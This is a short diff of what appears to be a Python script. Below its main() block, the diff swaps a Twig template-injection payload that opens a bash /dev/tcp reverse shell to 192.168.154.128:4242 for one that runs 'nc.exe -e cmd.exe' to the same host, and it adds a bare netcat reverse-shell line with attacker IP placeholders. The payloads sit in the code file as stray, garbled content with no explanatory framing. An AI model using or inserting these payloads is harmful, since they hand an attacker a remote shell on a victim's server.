@@ -21,9 +21,10 @@ def main():
 if __name__ == '__main__':
     main()
 
-    
-     {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("bash -i >& /dev/tcp/192.168.154.128/4242 0>&1")}}
+  
+
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("nc.exe -e cmd.exe 192.168.154.128 4242")}}
         
-        
+nc.exe -e cmd.exe <Attacker_IP> <PORT>        
         
         
